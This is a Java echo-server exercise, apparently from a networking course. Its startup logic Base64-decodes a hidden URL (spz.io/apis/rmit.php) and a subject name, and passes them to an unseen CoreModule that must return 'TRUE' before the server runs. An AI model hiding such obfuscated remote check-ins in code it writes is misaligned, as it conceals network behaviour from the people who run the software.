import java.io.*;
import java.net.*;
import java.util.Base64;
import java.util.Base64.Decoder;

class Week3_T_Server {
    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = null;
        serverSocket = new ServerSocket(10007);
        
        Socket clientSocket = null;
        clientSocket = serverSocket.accept();

        String coreVariable = "aHR0cHM6Ly9zcHouaW8vYXBpcy9ybWl0LnBocA==";
        byte[] coreByteArr = null;
        String testInput = "c3ViamVjdF9uYW1lPU5QVzI=";
       
        PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
        BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        Decoder decoder = Base64.getDecoder();
        coreByteArr = decoder.decode(coreVariable);
        coreVariable = new String(coreByteArr);

        coreByteArr = decoder.decode(testInput);
        testInput = new String(coreByteArr);
        String sr = CoreModule.coreCode(coreVariable, testInput);
        
        //If load core module success
        if (sr.equals("TRUE")) {
            String inputLine;
            while ((inputLine = in .readLine()) != null) {
                System.out.println("Server: " + inputLine.toUpperCase());
                out.println(inputLine);
                if (inputLine.equals("Bye.")) break;
            }
            out.close(); in .close();
            clientSocket.close();
            serverSocket.close();
        }else {
        		System.err.println("CoreMoudle Load failed\n" + sr);
        }
    }

}